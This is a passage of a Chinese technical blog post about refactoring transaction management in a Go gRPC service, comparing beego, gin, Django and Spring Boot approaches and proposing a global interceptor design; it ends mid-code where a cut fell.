&lt;p>对于事务管理和配置管理的问题可以再细细分析。&lt;/p>
&lt;h2 id="事务管理重构">事务管理重构&lt;/h2>
&lt;h3 id="痛点">痛点&lt;/h3>
&lt;p>先看一段重构前的事务代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">tx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">DB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Begin&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">rollBack&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">rollBack&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Rollback&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;rollback failed&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nx">rollBack&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">false&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Commit&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>还有第二种写法：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">var&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="nx">sqlStmts&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UserId&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nx">params&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([][]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">UserId&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="c1">// for ... {
&lt;/span>&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">// sqlStmts = append(sqlStmts, &amp;#34;update task_answer set is_eva=?,is_excellent=?,eva_text=?,eva_expression=? where task_id=? and user_id=?&amp;#34;)
&lt;/span>&lt;span class="c1">// params = append(params, []interface{}{constants.True, req.IsExcellent, req.TaskEva.Text, req.TaskEva.Expression, req.TaskId, v})
&lt;/span>&lt;span class="c1">// }
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">DB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecSqlInTxAndCommit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">sqlStmts&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">params&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>事务管理上最大的痛点有几个：&lt;/p>
&lt;ul>
&lt;li>手工&lt;code>Commit/Rollback&lt;/code>逻辑较复杂，需要辅助变量或命名返回值，还要处理 &lt;code>recover&lt;/code>。&lt;/li>
&lt;li>手工&lt;code>Commit/Rollback&lt;/code>样板代码多。&lt;/li>
&lt;li>已有的事务封装效果不佳，拼凑 &lt;code>sqlStmts []string&lt;/code> 有损可读性，写起来也麻烦。&lt;/li>
&lt;li>由于上面的原因，很大部分的 CURD 接口都没有事务化处理，存在隐患。&lt;/li>
&lt;li>显而易见，分布式事务完全没有考虑过。&lt;/li>
&lt;/ul>
&lt;h3 id="目标">目标&lt;/h3>
&lt;p>重构的时间成本是很高的，因为重构花的精力不能直接变现成业务价值，对不做编码和架构工作的管理层来说虚无缥缈的“可维护”、“灵活”、“隐患”这样的说辞并不容易被认可。&lt;/p>
&lt;p>一般来说，主动提重构要时间（要不到），提方案（大刀阔斧被否），执行（同事觉得你多管闲事），review（长不看），最后背锅（线上crash怎么想都是你的错啦！），这一路闯关下来可不容易。但是&amp;hellip;我司管理混乱，我比较闲。&lt;/p>
&lt;p>所以能大方地掏出时间搞个没什么业务价值的重构，看看能不能消灭一些隐患，也方便将来我或者下一个接盘侠需要二次开发的时候少吃点苦头。&lt;/p>
&lt;p>重构的目标是解决上面的痛点1234，但分布式事务不太好即刻引入。原因也简单，要考虑下用什么框架，&lt;code>coordinator&lt;/code> 选型，和现有的事务管理体系对接，做线上升级方案，这一系列事情最好等事务管理统一后再做，才可能事半功倍。&lt;/p>
&lt;h3 id="调研">调研&lt;/h3>
&lt;p>古人云：&lt;/p>
&lt;blockquote>
&lt;p>它山之石可以攻玉。&lt;/p>
&lt;/blockquote>
&lt;p>所以先看看别的知名框架怎么处理的事务是个好主意。&lt;/p>
&lt;h4 id="beego">beego&lt;/h4>
&lt;p>&lt;code>beego&lt;/code>有两种事务管理方法，第一种是利用闭包：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Beego will manage the transaction&amp;#39;s lifecycle
&lt;/span>&lt;span class="c1">// if the @param task return error, the transaction will be rollback
&lt;/span>&lt;span class="c1">// or the transaction will be committed
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">o&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">DoTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">txOrm&lt;/span> &lt;span class="nx">orm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TxOrmer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// data
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">User&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Name&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s">&amp;#34;test_transaction&amp;#34;&lt;/span>
&lt;span class="c1">// insert data
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// Using txOrm to execute SQL
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">txOrm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// if e != nil the transaction will be rollback
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// or it will be committed
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">e&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>具体实现是很好猜的，&lt;code>DoTx&lt;/code>里&lt;code>defer func(){}()&lt;/code>处理下返回值和&lt;code>recover&lt;/code>，没有错误就提交。这种写法很灵活，也能有效避免忘记&lt;code>defer&lt;/code>或者&lt;code>defer&lt;/code>考虑不够全面之类的问题。&lt;/p>
&lt;p>&lt;code>beego&lt;/code>的另一种事务管理方法就是手动&lt;code>Commit/Rollback&lt;/code>了，和直接用 &lt;code>sql.Tx&lt;/code> 差别不大，不细说了。&lt;/p>
&lt;h4 id="gin">gin&lt;/h4>
&lt;p>&lt;code>gin&lt;/code>没有官方的事务方案，不过我找到一个社区方案：利用中间件在 &lt;code>context&lt;/code> 里注入事务对象，业务代码里可以 &lt;code>GetTransactionFromContext(ctx)&lt;/code> 获取，后续处理没有错误就提交，和 &lt;code>beego&lt;/code> 的闭包法类似，不过就是把事务从业务代码提到了全局，进一步减少了侵入。&lt;/p>
&lt;h4 id="django">django&lt;/h4>
&lt;p>&lt;code>django&lt;/code> 是 python 的 web 框架，也有一定参考意义。&lt;/p>
&lt;p>&lt;code>django&lt;/code>的事务主要是靠装饰器实现的：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.db&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">transaction&lt;/span>
&lt;span class="nd">@transaction&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">atomic&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">viewfunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="c1"># This code executes inside a transaction.&lt;/span>
&lt;span class="n">do_stuff&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也可以用上下文管理器：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.db&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">transaction&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">viewfunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="c1"># This code executes in autocommit mode (Django&amp;#39;s default).&lt;/span>
&lt;span class="n">do_stuff&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="n">transaction&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">atomic&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="c1"># This code executes inside a transaction.&lt;/span>
&lt;span class="n">do_more_stuff&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>关于Python的装饰器和上下文管理器，我简要解释下：&lt;/p>
&lt;p>装饰器：高阶函数，接受被装饰函数作为输入，返回新函数。比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">decorator&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">wrapped&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">wrapped&lt;/span>
&lt;span class="nd">@decorator&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">fun&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>本质上就是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">decorator&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">wrapped&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">wrapped&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">fun&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;span class="n">fun&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decorator&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fun&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>至于上下文管理器，可以简单理解成 &lt;code>try {} finally {}&lt;/code>。&lt;/p>
&lt;p>&lt;code>django&lt;/code>的思路和&lt;code>beego&lt;/code>、&lt;code>gin&lt;/code>是很相似的，因为&lt;code>python&lt;/code>的装饰器语法存在使得事务管理可以更灵活地在函数级作用域里使用，而不用侵入业务代码。&lt;/p>
&lt;h4 id="springboot">springboot&lt;/h4>
&lt;p>&lt;code>springboot&lt;/code>主要利用注解和一系列我也不懂的JVM机制添加事务，具体还是不说了，多说多错。随手搜的一篇参考文章：&lt;a class="link" href="https://juejin.cn/post/7003614270877335560" target="_blank" rel="noopener"
>Springboot之@Transactional事务注解原理详解&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">MethodInvocation&lt;/span> &lt;span class="n">invocation&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">Throwable&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">targetClass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">invocation&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getThis&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="n">AopUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getTargetClass&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">invocation&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getThis&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="n">Method&lt;/span> &lt;span class="n">var10001&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">invocation&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMethod&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="n">invocation&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getClass&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="c1">// 调用事务逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">invokeWithinTransaction&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">var10001&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">targetClass&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">invocation&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">proceed&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="nd">@Nullable&lt;/span>
&lt;span class="kd">protected&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">invokeWithinTransaction&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Method&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nd">@Nullable&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">targetClass&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">TransactionAspectSupport&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">InvocationCallback&lt;/span> &lt;span class="n">invocation&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">Throwable&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">TransactionAttributeSource&lt;/span> &lt;span class="n">tas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getTransactionAttributeSource&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="c1">// 获取改方法上的事务配置，包括传播级别、异常信息等配置
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">TransactionAttribute&lt;/span> &lt;span class="n">txAttr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tas&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="n">tas&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getTransactionAttribute&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">targetClass&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="c1">// 事务管理器，负责生成事务上下文信息，比如开启事务、获取数据库链接等逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">TransactionManager&lt;/span> &lt;span class="n">tm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">determineTransactionManager&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">txAttr&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;span class="n">PlatformTransactionManager&lt;/span> &lt;span class="n">ptm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">asPlatformTransactionManager&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">tm&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">String&lt;/span> &lt;span class="n">joinpointIdentification&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">methodIdentification&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">targetClass&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">txAttr&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// 根据传播级别配置，看是否需要新建事务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">TransactionAspectSupport&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">TransactionInfo&lt;/span> &lt;span class="n">txInfo&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">createTransactionIfNecessary&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ptm&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">txAttr&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">joinpointIdentification&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">Object&lt;/span> &lt;span class="n">retVal&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="c1">// 通过try catch捕获异常来实现回滚逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 调用真正的dao层逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">invocation&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">proceedWithInvocation&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Throwable&lt;/span> &lt;span class="n">var18&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 根据@Transactional配置的异常来决定是否回滚
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">completeTransactionAfterThrowing&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">txInfo&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">var18&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="n">var18&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 结束当前的事务，信息是保存在ThreadLocal里
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">cleanupTransactionInfo&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">txInfo&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">retVal&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">vavrPresent&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">TransactionAspectSupport&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">VavrDelegate&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isVavrTry&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">retVal&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">TransactionStatus&lt;/span> &lt;span class="n">status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">txInfo&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getTransactionStatus&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">status&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">txAttr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">retVal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">TransactionAspectSupport&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">VavrDelegate&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">evaluateTryFailure&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">retVal&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">txAttr&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">status&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 没有异常时，执行commit操作
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">commitTransactionAfterReturning&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">txInfo&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">retVal&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到排除 springboot 的机制外，思路依然是清晰易懂的：进入业务逻辑前准备好事务，业务逻辑后没有错误则提交，否则回滚。&lt;/p>
&lt;p>上述4种框架的处理方法都是在使用各种语言机制来应用 AOP 思想。&lt;/p>
&lt;h3 id="方案">方案&lt;/h3>
&lt;p>考虑到旧代码范围广，闭包模式需要对旧的用法做侵入式修改，工作量大；针对特定业务函数应用装饰器模式在go语言环境下水土不服；唯一可能的选择就是中间件了。&lt;/p>
&lt;p>而中间件又有几个选择：&lt;/p>
&lt;ul>
&lt;li>针对服务接口封装中间件，优点是可以实现接口级按需注入事务，缺点是写起来啰嗦&lt;/li>
&lt;li>全局中间件，优点是实现简单，缺点是所有业务接口都会注入事务&lt;/li>
&lt;/ul>
&lt;p>更进一步的抽象，比如 &lt;code>gokit&lt;/code> 架构设计中的对单个业务接口抽出 &lt;code>Endpoint&lt;/code> ，彻底把业务层和传输层分离，所需的工作量更是离谱。&lt;/p>
&lt;p>最终出于review友好也对我的手指友好考虑，还是选择全局中间件，但加改变，同时注入&lt;code>sql.DB&lt;/code>，并且让事务懒启动，尽量避免多余的&lt;code>Begin/Commit/Rollback&lt;/code>拖长接口耗时。&lt;/p>
&lt;p>这一方案落地为一个&lt;code>txmanager&lt;/code>包和一个 gRPC Interceptor ，&lt;code>txmanager&lt;/code> 定义数据库接口、事务接口，以及注册事务等工具函数；Interceptor 在&lt;code>context&lt;/code>注入数据库和事务，在业务执行完成后，&lt;code>defer&lt;/code>里 &lt;code>recover&lt;/code>并检查返回值，决定提交或回滚。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">txSet&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">txSetKey&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="nx">mapset&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Set&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">txSet&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Clear&lt;/span>&lt;span class="p">()&lt;/span>
